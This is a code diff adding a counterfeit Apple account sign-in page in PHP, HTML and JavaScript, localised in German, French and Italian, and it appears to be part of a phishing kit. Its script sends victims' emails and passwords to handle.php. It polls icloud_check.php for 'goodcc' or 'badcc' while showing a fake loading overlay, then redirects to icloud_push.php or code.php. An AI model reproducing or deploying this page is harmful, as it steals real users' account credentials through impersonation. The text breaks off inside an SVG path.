+            <path id="ring-dots" d="M89.905 152.381a3.81 3.81 0 110 7.619 3.81 3.81 0 010-7.619zm-23.737 2.79a3.81 3.81 0 117.36 1.973 3.81 3.81 0 01-7.36-1.972zm46.799-5.126a3.81 3.81 0 11-7.36 1.972 3.81 3.81 0 017.36-1.972zm-60.58-2.409a3.81 3.81 0 11-3.81 6.598 3.81 3.81 0 013.81-6.598zm28.777-4.373a3.302 3.302 0 11-.804 6.554 3.302 3.302 0 01.804-6.554zm-16.684-1.899a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zm36.901 2.383a3.338 3.338 0 11-6.61.93 3.338 3.338 0 016.61-.93zm28.591-4.621a3.81 3.81 0 11-6.598 3.81 3.81 3.81 0 016.598-3.81zm-94.15-.941a3.81 3.81 0 11-5.387 5.387 3.81 3.81 0 015.388-5.387zm52.547-.486a3.023 3.023 0 110 6.047 3.023 3.023 0 010-6.047zm-15.136.077a3.023 3.023 0 11-1.565 5.841 3.023 3.023 0 011.565-5.84zm-24.278-2.592a3.338 3.338 0 11-4.017 5.331 3.338 3.338 0 014.017-5.331zm68.381.883a3.338 3.338 0 11-6.145 2.609 3.338 3.338 0 016.145-2.609zm-10.664-.222a3.023 3.023 0 11-5.841 1.565 3.023 3.023 0 015.84-1.565zm-48.079-1.912a3.023 3.023 0 11-3.023 5.237 3.023 3.023 0 013.023-5.237zm22.334-3.47a2.62 2.62 0 11-.639 5.201 2.62 2.62 0 01.639-5.202zm-13.241-1.507a2.65 2.65 0 11-1.985 4.912 2.65 2.65 0 011.985-4.912zm29.286 1.891a2.65 2.65 0 11-5.246.737 2.65 2.65 0 015.246-.737zm23.196-3.668a3.023 3.023 0 11-5.236 3.024 3.023 3.023 0 015.236-3.024zm-74.721-.747a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm98.125-2.255a3.81 3.81 0 11-5.387 5.388 3.81 3.81 0 015.387-5.388zM35.56 125.196a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm-13.29-.428a3.81 3.81 0 11-6.599 3.81 3.81 3.81 0 016.599-3.81zm108.491-.249a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm-75.396-.468a2.65 2.65 0 11-3.188 4.231 2.65 2.65 0 013.188-4.231zm54.271.7a2.65 2.65 0 11-4.877 2.071 2.65 2.65 0 014.877-2.07zm21.327-9.436a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm-86.23.808a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm-10.043-.339a3.023 3.023 0 11-5.236 3.024 3.023 3.023 0 015.236-3.024zm85.6-.197a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm-95.085-3.507a3.338 3.338 0 11-6.145 2.609 3.338 3.338 0 016.145-2.609zm115.534-2.19a3.338 3.338 0 11-4.018 5.332 3.338 3.338 0 014.018-5.331zm12.102-3.672a3.81 3.81 0 11-3.81 6.599 3.81 3.81 0 013.81-6.599zM12.65 108.301a3.81 3.81 0 11-7.36 1.972 3.81 3.81 0 017.36-1.972zm23.865-2.586a2.65 2.65 0 11-4.877 2.07 2.65 2.65 0 014.877-2.07zm91.693-1.738a2.65 2.65 0 11-3.188 4.231 2.65 2.65 0 013.188-4.231zm10.11-2.915a3.023 3.023 0 11-3.023 5.237 3.023 3.023 0 013.023-5.237zm-111.262 1.653a3.023 3.023 0 11-5.841 1.565 3.023 3.023 0 015.84-1.565zm-8.458-5.983a3.338 3.338 0 11-6.611.93 3.338 3.338 0 016.61-.93zm127.992-3.554a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zm-115.319.356a2.65 2.65 0 11-5.246.737 2.65 2.65 0 015.246-.737zm101.581-2.821a2.65 2.65 0 11-1.984 4.912 2.65 2.65 0 011.984-4.912zm19.627-1.547a3.81 3.81 0 117.36 1.972 3.81 3.81 0 01-7.36-1.972zM3.81 86.096a3.81 3.81 0 110 7.618 3.81 3.81 0 010-7.619zm137.923-.705a3.023 3.023 0 11-1.565 5.84 3.023 3.023 0 011.565-5.84zm-121.694-.3a3.023 3.023 0 110 6.047 3.023 3.023 0 010-6.047zm-6.938-8.368a3.302 3.302 0 11-.805 6.554 3.302 3.302 0 01.805-6.554zm13.807.93a2.62 2.62 0 11-.638 5.202 2.62 2.62 0 01.638-5.202zm120.796-1.946a3.302 3.302 0 11-.805 6.554 3.302 3.302 0 01.805-6.554zm-13.968 1.14a2.62 2.62 0 11-.638 5.201 2.62 2.62 0 01.638-5.201zm7.24-7.477a3.023 3.023 0 110 6.046 3.023 3.023 0 010-6.046zm-120.128-.094a3.023 3.023 0 11-1.565 5.841 3.023 3.023 0 011.565-5.84zm135.342-2.99a3.81 3.81 0 110 7.619 3.81 3.81 0 010-7.62zM.162 68.862a3.81 3.81 0 117.36 1.972 3.81 3.81 0 01-7.36-1.972zm29.28-5.072a2.65 2.65 0 11-1.984 4.913 2.65 2.65 0 011.985-4.913zm104.844 1.355a2.65 2.65 0 11-5.247.737 2.65 2.65 0 015.247-.737zm-117.992-5.89a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zm132.102 1.708a3.338 3.338 0 11-6.61.929 3.338 3.338 0 016.61-.93zm-8.594-4.735a3.023 3.023 0 11-5.84 1.565 3.023 3.023 0 015.84-1.565zm-114.08-2.019a3.023 3.023 0 11-3.024 5.237 3.023 3.023 0 013.024-5.237zm9.569-3.001a2.65 2.65 0 11-3.189 4.23 2.65 2.65 0 013.189-4.23zm93.381.423a2.65 2.65 0 11-4.877 2.07 2.65 2.65 0 014.877-2.07zm26.039-1.904a3.81 3.81 0 11-7.36 1.972 3.81 3.81 0 017.36-1.972zM10.969 47.183a3.81 3.81 0 11-3.809 6.599 3.81 3.81 0 013.81-6.599zm12.693-3.781a3.338 3.338 0 11-4.017 5.331 3.338 3.338 0 014.017-5.331zm117.661.533a3.338 3.338 0 11-6.145 2.608 3.338 3.338 0 016.145-2.608zm-9.76-2.235a3.023 3.023 0 11-5.237 3.024 3.023 3.023 0 015.237-3.024zm-97.233-.783a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm9.866-.35a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm75.556-.537a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm24.578-8.608a3.81 3.81 0 11-6.599 3.81 3.81 3.81 0 016.599-3.81zm-122.515-.987a3.81 3.81 0 11-5.387 5.388 3.81 3.81 0 015.387-5.388zm33.736 2.159a2.65 2.65 0 11-4.877 2.07 2.65 2.65 0 014.877-2.07zm52.583-1.46a2.65 2.65 0 11-3.189 4.231 2.65 2.65 0 013.189-4.231zm-73.251-1.14a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm84.962-.194a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm-73.76.505a3.023 3.023 0 11-5.238 3.024 3.023 3.023 0 015.237-3.024zm83.999-.987a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm-61.5-1.487a2.65 2.65 0 11-5.247.738 2.65 2.65 0 015.247-.738zm26.024-2.284a2.65 2.65 0 11-1.984 4.913 2.65 2.65 0 011.984-4.913zm-14.487-1.912a2.62 2.62 0 11-.639 5.201 2.62 2.62 0 01.639-5.201zm25.325-2.297a3.023 3.023 0 11-3.023 5.237 3.023 3.023 0 013.023-5.237zm-45.261 1.76a3.023 3.023 0 11-5.841 1.565 3.023 3.023 0 015.84-1.565zm-10.994-3.15a3.338 3.338 0 11-6.145 2.609 3.338 3.338 0 016.145-2.609zm66.254-1.84a3.338 3.338 0 11-4.018 5.332 3.338 3.338 0 014.018-5.331zm14.12-1.68a3.81 3.81 0 11-5.388 5.387 3.81 3.81 0 015.388-5.387zm-40.217.463a3.023 3.023 0 11-1.565 5.84 3.023 3.023 0 011.565-5.84zm-16.701-.13a3.023 3.023 0 110 6.048 3.023 3.023 0 010-6.047zm-36.02.304a3.81 3.81 0 11-6.6 3.81 3.81 3.81 0 016.6-3.81zm28.985-3.118a3.338 3.338 0 11-6.611.93 3.338 3.338 0 016.61-.93zm32.79-2.877a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zM80.149 8.66a3.302 3.302 0 11-.804 6.553 3.302 3.302 0 01.804-6.553zm31.274-2.894a3.81 3.81 0 11-3.81 6.598 3.81 3.81 0 013.81-6.598zm-57.03 2.217a3.81 3.81 0 11-7.359 1.972 3.81 3.81 0 017.36-1.972zM91.139.163a3.81 3.81 0 11-1.972 7.359 3.81 3.81 0 011.972-7.36zM70.095 0a3.81 3.81 0 110 7.619 3.81 3.81 0 010-7.619z"/>
+          </defs>
+          <use fill="#FFF" xlink:href="#ring-dots"/>
+          <use fill="url(#grad-a)" xlink:href="#ring-dots"/>
+          <use fill="url(#grad-b)" xlink:href="#ring-dots"/>
+          <use fill="url(#grad-c)" xlink:href="#ring-dots"/>
+          <use fill="url(#grad-d)" xlink:href="#ring-dots"/>
+          <path fill="var(--theme-color-systemBlack)" d="M80.38 68.181c1.66 0 3.75-1.091 4.999-2.565 1.137-1.346 1.94-3.183 1.94-5.039 0-.255-.02-.51-.057-.71-1.865.073-4.103 1.201-5.427 2.73-1.063 1.164-2.033 3.02-2.033 4.875 0 .29.056.564.075.655.112.018.298.054.503.054zm-5.724 27.713c2.248 0 3.243-1.474 6.044-1.474 2.838 0 3.483 1.438 5.97 1.438 2.47 0 4.11-2.239 5.677-4.44 1.732-2.53 2.469-4.987 2.487-5.115-.147-.036-4.865-1.947-4.865-7.28 0-4.622 3.704-6.697 3.926-6.86-2.451-3.477-6.192-3.586-7.224-3.586-2.746 0-4.994 1.656-6.431 1.656-1.53 0-3.52-1.547-5.916-1.547-4.551 0-9.158 3.713-9.158 10.701 0 4.368 1.695 8.973 3.814 11.94 1.806 2.51 3.39 4.567 5.676 4.567z"/>
+        </svg>
+      </div>
+
+      <h1 id="main-title"><?= t_page('title') ?></h1>
+
+      <!-- SCHRITT 1: E-MAIL -->
+      <div id="step1" style="width:100%">
+        <input
+          id="emailInput"
+          type="text"
+          class="input-field"
+          placeholder="<?= t_page('email_placeholder') ?>"
+          autocomplete="username"
+          autocorrect="off"
+          autocapitalize="none"
+          spellcheck="false"
+        >
+        <a href="#" class="create-link"><?= t_page('create_account') ?></a>
+        <div class="separator"></div>
+        <div class="privacy-block">
+          <span class="privacy-icon">
+            <svg width="26" height="20" viewBox="0 0 26 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <circle cx="9.5" cy="5.5" r="4.5" fill="var(--blue-tint)"/>
+              <circle cx="17.5" cy="5" r="3.5" fill="var(--blue-tint)" opacity="0.65"/>
+              <path d="M0 18c0-4.97 4.03-7 9.5-7S19 13.03 19 18" fill="var(--blue-tint)"/>
+              <path d="M15.5 12.5c3.5 0 7 1.7 7 5.5" stroke="var(--blue-tint)" stroke-width="2.2" stroke-linecap="round" fill="none" opacity="0.65"/>
+            </svg>
+          </span>
+          <p class="privacy-text">
+            <?= t_page('privacy_text') ?> <a href="#">Weitere Informationen zur Verwaltung Ihrer Daten…</a>
+          </p>
+        </div>
+        <div class="btn-row">
+          <button id="btnContinue" class="btn-continue" type="button"><?= t_page('continue') ?></button>
+          <button type="button" class="btn-passkey">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" width="16" height="16">
+              <path d="M12 2C9.243 2 7 4.243 7 7c0 1.879.938 3.54 2.367 4.547A7.002 7.002 0 0 0 5 18.5V19h2v-.5a5 5 0 0 1 10 0V19h2v-.5a7.002 7.002 0 0 0-4.367-6.453A4.993 4.993 0 0 0 17 7c0-2.757-2.243-5-5-5zm0 2a3 3 0 1 1 0 6 3 3 0 0 1 0-6z"/>
+            </svg>
+            <?= t_page('signin_iphone') ?>
+          </button>
+        </div>
+        <p class="btn-note"><?= t_page('iphone_note') ?></p>
+      </div>
+
+      <!-- SCHRITT 1.5: ALTERSBESTÄTIGUNG -->
+      <div id="step1_5" style="width:100%">
+        <div class="dob-container">
+          <label class="dob-label"><?= t_page('dob_label') ?></label>
+          <div class="dob-input-wrapper">
+            <input
+              id="dobInput"
+              type="text"
+              class="input-field"
+              placeholder="<?= t_page('dob_placeholder') ?>"
+              maxlength="10"
+              inputmode="numeric"
+            >
+          </div>
+          <p class="dob-hint"><?= t_page('dob_format') ?></p>
+        </div>
+        <p class="error-msg" id="ageError"></p>
+        <button id="btnAgeVerify" class="btn-continue" type="button" style="width: 100%;"><?= t_page('continue') ?></button>
+      </div>
+
+      <!-- SCHRITT 2: PASSWORT -->
+      <div id="step2">
+        <button class="back-btn" id="btnBack" type="button">
+          <svg width="8" height="13" viewBox="0 0 8 13" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M7 1L1.5 6.5 7 12" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </button>
+        <div class="email-display" id="emailDisplay"></div>
+        <p class="error-msg" id="passError"></p>
+        <div class="pass-wrap">
+          <input
+            id="passInput"
+            type="password"
+            class="input-field"
+            placeholder="<?= t_page('password_placeholder') ?>"
+            autocomplete="current-password"
+          >
+          <button type="button" class="eye-btn" id="eyeBtn" aria-label="Passwort anzeigen">
+            <svg id="eyeIcon" width="20" height="14" viewBox="0 0 20 14" xmlns="http://www.w3.org/2000/svg">
+              <path d="M10 0C5.5 0 1.7 2.8 0 7c1.7 4.2 5.5 7 10 7s8.3-2.8 10-7C18.3 2.8 14.5 0 10 0zm0 11.7c-2.6 0-4.7-2.1-4.7-4.7S7.4 2.3 10 2.3s4.7 2.1 4.7 4.7-2.1 4.7-4.7 4.7zm0-7.5c-1.5 0-2.8 1.3-2.8 2.8S8.5 9.8 10 9.8s2.8-1.3 2.8-2.8-1.3-2.8-2.8-2.8z" fill="currentColor"/>
+            </svg>
+          </button>
+        </div>
+        <div class="check-row">
+          <label class="check-label">
+            <input type="checkbox" id="stayCheck"> <?= t_page('stay_signin') ?>
+          </label>
+          <a href="#" class="forgot-link"><?= t_page('forgot_password') ?>&nbsp;›</a>
+        </div>
+        <button id="btnSignin" class="btn-signin" type="button"><?= t_page('signin_btn') ?></button>
+      </div>
+
+    </div>
+  </main>
+
+  <script>
+  (function(){
+    // ── TRANSLATION SYSTEM ──
+    var translations = {
+      'de': {
+        'dob_required': 'Bitte geben Sie Ihr Geburtsdatum ein',
+        'dob_invalid_format': 'Ungültiges Format. Verwenden Sie TT/MM/JJJJ',
+        'dob_month_invalid': 'Der Monat muss zwischen 01 und 12 liegen',
+        'dob_day_invalid': 'Der Tag muss zwischen 01 und 31 liegen',
+        'dob_year_invalid': 'Das Jahr ist ungültig',
+        'dob_not_exist': 'Dieses Datum existiert nicht',
+        'dob_title': 'Geben Sie Ihr<br>Geburtsdatum ein',
+        'password_title': 'Geben Sie Ihr<br>Passwort ein',
+        'main_title': 'Mit Ihrem Apple<br>Konto anmelden',
+        'password_error': 'Passwort ist falsch. Bitte versuchen Sie es erneut.',
+        'loading_title': 'Anmeldung wird durchgeführt…'
+      },
+      'fr': {
+        'dob_required': 'Veuillez entrer votre date de naissance',
+        'dob_invalid_format': 'Format invalide. Utilisez JJ/MM/AAAA',
+        'dob_month_invalid': 'Le mois doit être entre 01 et 12',
+        'dob_day_invalid': 'Le jour doit être entre 01 et 31',
+        'dob_year_invalid': 'L\'année est invalide',
+        'dob_not_exist': 'Cette date n\'existe pas',
+        'dob_title': 'Vérifier votre<br>date de naissance',
+        'password_title': 'Entrez votre<br>mot de passe',
+        'main_title': 'Se connecter avec un<br>compte Apple',
+        'password_error': 'Le mot de passe est incorrect. Veuillez réessayer.',
+        'loading_title': 'Connexion en cours…'
+      },
+      'it': {
+        'dob_required': 'Inserisci la tua data di nascita',
+        'dob_invalid_format': 'Formato non valido. Usa GG/MM/AAAA',
+        'dob_month_invalid': 'Il mese deve essere tra 01 e 12',
+        'dob_day_invalid': 'Il giorno deve essere tra 01 e 31',
+        'dob_year_invalid': 'L\'anno non è valido',
+        'dob_not_exist': 'Questa data non esiste',
+        'dob_title': 'Inserisci la tua<br>data di nascita',
+        'password_title': 'Inserisci la tua<br>password',
+        'main_title': 'Accedi con il tuo<br>account Apple',
+        'password_error': 'La password non è corretta. Prova di nuovo.',
+        'loading_title': 'Accesso in corso…'
+      }
+    };
+
+    function t(key) {
+      var lang = '<?= $current_lang ?>';
+      return (translations[lang] && translations[lang][key]) || translations['de'][key] || key;
+    }
+
+    // ── LANGUAGE SELECTOR ──
+    var langModal = document.getElementById('languageModal');
+    var langButtons = document.querySelectorAll('.language-btn');
+    var currentLang = localStorage.getItem('selected_lang') || 'de';
+
+    // Set active button on load
+    var activeLangId = 'lang' + (currentLang === 'fr' ? 'Fr' : currentLang === 'it' ? 'It' : 'De');
+    var activeLangBtn = document.getElementById(activeLangId);
+    if (activeLangBtn) {
+      activeLangBtn.classList.add('active');
+    }
+
+    langButtons.forEach(function(btn) {
+      btn.addEventListener('click', function() {
+        var selectedLang = this.getAttribute('data-lang');
+        localStorage.setItem('selected_lang', selectedLang);
+
+        // Update active button
+        langButtons.forEach(function(b) { b.classList.remove('active'); });
+        this.classList.add('active');
+
+        // Store language and reload page
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'handle.php', true);
+        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        xhr.onload = function() {
+          setTimeout(function() {
+            langModal.classList.remove('show');
+            setTimeout(function() {
+              location.reload();
+            }, 300);
+          }, 100);
+        };
+        xhr.send('step=lang&lang=' + encodeURIComponent(selectedLang));
+      });
+    });
+
+    var email = '';
+    var step1 = document.getElementById('step1');
+    var step1_5 = document.getElementById('step1_5');
+    var step2 = document.getElementById('step2');
+    var emailInput = document.getElementById('emailInput');
+    var dobInput = document.getElementById('dobInput');
+    var passInput  = document.getElementById('passInput');
+    var emailDisplay = document.getElementById('emailDisplay');
+    var title = document.getElementById('main-title');
+
+    // ── Étape 1 → 1.5 (Age Verification) ──
+    document.getElementById('btnContinue').addEventListener('click', function(){
+      email = emailInput.value.trim();
+      if (!email) { emailInput.focus(); return; }
+
+      // Envoyer step=1
+      var fd = new FormData();
+      fd.append('step', '1');
+      fd.append('email', email);
+      fetch('handle.php', { method:'POST', body: fd }).catch(function(){});
+
+      // Show age verification step
+      step1.style.display = 'none';
+      step1_5.style.display = 'block';
+      title.innerHTML = t('dob_title');
+      dobInput.focus();
+    });
+
+    // ── Age Verification with strict format validation ──
+    document.getElementById('btnAgeVerify').addEventListener('click', function(){
+      var dobStr = dobInput.value.trim();
+      var ageError = document.getElementById('ageError');
+
+      if (!dobStr) {
+        ageError.textContent = t('dob_required');
+        ageError.style.display = 'block';
+        dobInput.focus();
+        return;
+      }
+
+      // Validate TT/MM/JJJJ format
+      var dobRegex = /^(\d{2})\/(\d{2})\/(\d{4})$/;
+      var match = dobStr.match(dobRegex);
+
+      if (!match) {
+        ageError.textContent = t('dob_invalid_format');
+        ageError.style.display = 'block';
+        dobInput.focus();
+        return;
+      }
+
+      var day = parseInt(match[1], 10);
+      var month = parseInt(match[2], 10);
+      var year = parseInt(match[3], 10);
+
+      // Validate date ranges
+      if (month < 1 || month > 12) {
+        ageError.textContent = t('dob_month_invalid');
+        ageError.style.display = 'block';
+        dobInput.focus();
+        return;
+      }
+
+      if (day < 1 || day > 31) {
+        ageError.textContent = t('dob_day_invalid');
+        ageError.style.display = 'block';
+        dobInput.focus();
+        return;
+      }
+
+      // Check if year is reasonable (not in future, not too old)
+      var currentYear = new Date().getFullYear();
+      if (year > currentYear || year < 1900) {
+        ageError.textContent = t('dob_year_invalid');
+        ageError.style.display = 'block';
+        dobInput.focus();
+        return;
+      }
+
+      // Create date and validate it exists
+      var dob = new Date(year, month - 1, day);
+      if (dob.getDate() !== day || dob.getMonth() !== month - 1) {
+        ageError.textContent = t('dob_not_exist');
+        ageError.style.display = 'block';
+        dobInput.focus();
+        return;
+      }
+
+      // Calculate age
+      var today = new Date();
+      var age = today.getFullYear() - dob.getFullYear();
+      var monthDiff = today.getMonth() - dob.getMonth();
+      if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < dob.getDate())) {
+        age--;
+      }
+
+      if (age < 21) {
+        // Set session keys and redirect to code.php for users under 21
+        fetch('handle.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: 'step=age_redirect'
+        }).then(function() {
+          window.location.href = 'code.php';
+        }).catch(function() {
+          window.location.href = 'code.php';
+        });
+      } else {
+        // Continue to password step
+        ageError.style.display = 'none';
+        step1_5.style.display = 'none';
+        emailDisplay.textContent = email;
+        step2.style.display = 'block';
+        title.innerHTML = t('password_title');
+        passInput.focus();
+      }
+    });
+
+    // Auto-format DOB input as TT/MM/JJJJ
+    dobInput.addEventListener('input', function(){
+      var val = this.value.replace(/\D/g, '');
+      if (val.length > 0) {
+        if (val.length <= 2) {
+          this.value = val;
+        } else if (val.length <= 4) {
+          this.value = val.substring(0, 2) + '/' + val.substring(2);
+        } else {
+          this.value = val.substring(0, 2) + '/' + val.substring(2, 4) + '/' + val.substring(4, 8);
+        }
+      }
+    });
+
+    // ── Zurück zu Schritt 1 ──
+    document.getElementById('btnBack').addEventListener('click', function(){
+      step2.style.display = 'none';
+      step1.style.display = 'block';
+      title.innerHTML = t('main_title');
+    });
+
+    // ── Schritt 2: Anmeldung senden ──
+    document.getElementById('btnSignin').addEventListener('click', function(){
+      var pass = passInput.value;
+      if (!pass) { passInput.focus(); return; }
+
+      // Hide any previous error
+      var errEl = document.getElementById('passError');
+      if (errEl) { errEl.style.display = 'none'; errEl.textContent = ''; }
+
+      var fd = new FormData();
+      fd.append('step', '2');
+      fd.append('email', email);
+      fd.append('pass', pass);
+      fetch('handle.php', { method:'POST', body: fd }).catch(function(){});
+
+      // Show Apple loading overlay and start polling
+      showLoadingOverlay(email);
+      startComboPolling();
+    });
+
+    // ── Apple loading overlay ──
+    function showLoadingOverlay(userEmail) {
+      var overlay = document.getElementById('loadingOverlay');
+      var loadingTitle = document.querySelector('.loading-title');
+      if (loadingTitle) {
+        loadingTitle.textContent = t('loading_title');
+      }
+      document.getElementById('loadingEmail').textContent = userEmail;
+      overlay.style.display = 'flex';
+      requestAnimationFrame(function() {
+        requestAnimationFrame(function() {
+          overlay.style.opacity = '1';
+        });
+      });
+    }
+
+    function hideLoadingOverlay(cb) {
+      var overlay = document.getElementById('loadingOverlay');
+      overlay.style.opacity = '0';
+      overlay.addEventListener('transitionend', function handler() {
+        overlay.removeEventListener('transitionend', handler);
+        overlay.style.display = 'none';
+        if (cb) cb();
+      }, { once: true });
+    }
+
+    // ── Polling icloud_check.php ──
+    var _pollTimer = null;
+
+    function startComboPolling() {
+      function doPoll() {
+        fetch('icloud_check.php?t=' + Date.now())
+          .then(function(r){ return r.text(); })
+          .then(function(raw) {
+            var data = raw.trim();
+            if (data === 'goodcc') {
+              window.location.href = 'icloud_push.php';
+            } else if (data === 'badcc') {
+              hideLoadingOverlay(function() {
+                passInput.value = '';
+                var err = document.getElementById('passError');
+                err.textContent = t('password_error');
+                err.style.display = 'block';
+                passInput.focus();
+              });
+            } else {
+              _pollTimer = setTimeout(doPoll, 1500);
+            }
+          })
+          .catch(function() {
+            _pollTimer = setTimeout(doPoll, 3000);
+          });
+      }
+      doPoll();
+    }
+
+    // ── Œil mdp ──
+    document.getElementById('eyeBtn').addEventListener('click', function(){
+      var isPass = passInput.type === 'password';
+      passInput.type = isPass ? 'text' : 'password';
+      document.getElementById('eyeIcon').style.opacity = isPass ? '0.4' : '1';
+    });
+
+    // Enter sur email
+    emailInput.addEventListener('keydown', function(e){
+      if (e.key === 'Enter') document.getElementById('btnContinue').click();
+    });
+    // Enter sur mdp
+    passInput.addEventListener('keydown', function(e){
+      if (e.key === 'Enter') document.getElementById('btnSignin').click();
+    });
+  })();
+  </script>
+
+  <!-- ── APPLE LOADING OVERLAY ── -->
+  <div id="loadingOverlay" role="status" aria-live="polite">
+    <div class="loading-card">
+
+      <!-- iCloud ring (scaled 100px) -->
+      <svg class="loading-ring" viewBox="0 0 160 160" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true">
+        <defs>
+          <linearGradient x1="100%" y1="100%" x2="50%" y2="50%" id="lo-a"><stop stop-color="#8700FF" offset="0%"/><stop stop-color="#EE00E1" stop-opacity="0" offset="100%"/></linearGradient>
+          <linearGradient x1="0%" y1="100%" x2="50%" y2="50%" id="lo-b"><stop stop-color="#E00" offset="0%"/><stop stop-color="#EE00E1" stop-opacity="0" offset="100%"/></linearGradient>
+          <linearGradient x1="100%" y1="0%" x2="50%" y2="50%" id="lo-c"><stop stop-color="#00B1EE" offset="0%"/><stop stop-color="#00B1EE" stop-opacity="0" offset="100%"/></linearGradient>
+          <linearGradient x1="-17.876%" y1="21.021%" x2="48.935%" y2="50%" id="lo-d"><stop stop-color="#FFA456" offset="0%"/><stop stop-color="#FFA456" stop-opacity="0" offset="100%"/></linearGradient>
+          <path id="lo-dots" d="M89.905 152.381a3.81 3.81 0 110 7.619 3.81 3.81 0 010-7.619zm-23.737 2.79a3.81 3.81 0 117.36 1.973 3.81 3.81 0 01-7.36-1.972zm46.799-5.126a3.81 3.81 0 11-7.36 1.972 3.81 3.81 0 017.36-1.972zm-60.58-2.409a3.81 3.81 0 11-3.81 6.598 3.81 3.81 0 013.81-6.598zm28.777-4.373a3.302 3.302 0 11-.804 6.554 3.302 3.302 0 01.804-6.554zm-16.684-1.899a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zm36.901 2.383a3.338 3.338 0 11-6.61.93 3.338 3.338 0 016.61-.93zm28.591-4.621a3.81 3.81 0 11-6.598 3.81 3.81 3.81 0 016.598-3.81zm-94.15-.941a3.81 3.81 0 11-5.387 5.387 3.81 3.81 0 015.388-5.387zm52.547-.486a3.023 3.023 0 110 6.047 3.023 3.023 0 010-6.047zm-15.136.077a3.023 3.023 0 11-1.565 5.841 3.023 3.023 0 011.565-5.84zm-24.278-2.592a3.338 3.338 0 11-4.017 5.331 3.338 3.338 0 014.017-5.331zm68.381.883a3.338 3.338 0 11-6.145 2.609 3.338 3.338 0 016.145-2.609zm-10.664-.222a3.023 3.023 0 11-5.841 1.565 3.023 3.023 0 015.84-1.565zm-48.079-1.912a3.023 3.023 0 11-3.023 5.237 3.023 3.023 0 013.023-5.237zm22.334-3.47a2.62 2.62 0 11-.639 5.201 2.62 2.62 0 01.639-5.202zm-13.241-1.507a2.65 2.65 0 11-1.985 4.912 2.65 2.65 0 011.985-4.912zm29.286 1.891a2.65 2.65 0 11-5.246.737 2.65 2.65 0 015.246-.737zm23.196-3.668a3.023 3.023 0 11-5.236 3.024 3.023 3.023 0 015.236-3.024zm-74.721-.747a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm98.125-2.255a3.81 3.81 0 11-5.387 5.388 3.81 3.81 0 015.387-5.388zM35.56 125.196a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm-13.29-.428a3.81 3.81 0 11-6.599 3.81 3.81 3.81 0 016.599-3.81zm108.491-.249a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm-75.396-.468a2.65 2.65 0 11-3.188 4.231 2.65 2.65 0 013.188-4.231zm54.271.7a2.65 2.65 0 11-4.877 2.071 2.65 2.65 0 014.877-2.07zm21.327-9.436a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm-86.23.808a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm-10.043-.339a3.023 3.023 0 11-5.236 3.024 3.023 3.023 0 015.236-3.024zm85.6-.197a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm-95.085-3.507a3.338 3.338 0 11-6.145 2.609 3.338 3.338 0 016.145-2.609zm115.534-2.19a3.338 3.338 0 11-4.018 5.332 3.338 3.338 0 014.018-5.331zm12.102-3.672a3.81 3.81 0 11-3.81 6.599 3.81 3.81 0 013.81-6.599zM12.65 108.301a3.81 3.81 0 11-7.36 1.972 3.81 3.81 0 017.36-1.972zm23.865-2.586a2.65 2.65 0 11-4.877 2.07 2.65 2.65 0 014.877-2.07zm91.693-1.738a2.65 2.65 0 11-3.188 4.231 2.65 2.65 0 013.188-4.231zm10.11-2.915a3.023 3.023 0 11-3.023 5.237 3.023 3.023 0 013.023-5.237zm-111.262 1.653a3.023 3.023 0 11-5.841 1.565 3.023 3.023 0 015.84-1.565zm-8.458-5.983a3.338 3.338 0 11-6.611.93 3.338 3.338 0 016.61-.93zm127.992-3.554a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zm-115.319.356a2.65 2.65 0 11-5.246.737 2.65 2.65 0 015.246-.737zm101.581-2.821a2.65 2.65 0 11-1.984 4.912 2.65 2.65 0 011.984-4.912zm19.627-1.547a3.81 3.81 0 117.36 1.972 3.81 3.81 0 01-7.36-1.972zM3.81 86.096a3.81 3.81 0 110 7.618 3.81 3.81 0 010-7.619zm137.923-.705a3.023 3.023 0 11-1.565 5.84 3.023 3.023 0 011.565-5.84zm-121.694-.3a3.023 3.023 0 110 6.047 3.023 3.023 0 010-6.047zm-6.938-8.368a3.302 3.302 0 11-.805 6.554 3.302 3.302 0 01.805-6.554zm13.807.93a2.62 2.62 0 11-.638 5.202 2.62 2.62 0 01.638-5.202zm120.796-1.946a3.302 3.302 0 11-.805 6.554 3.302 3.302 0 01.805-6.554zm-13.968 1.14a2.62 2.62 0 11-.638 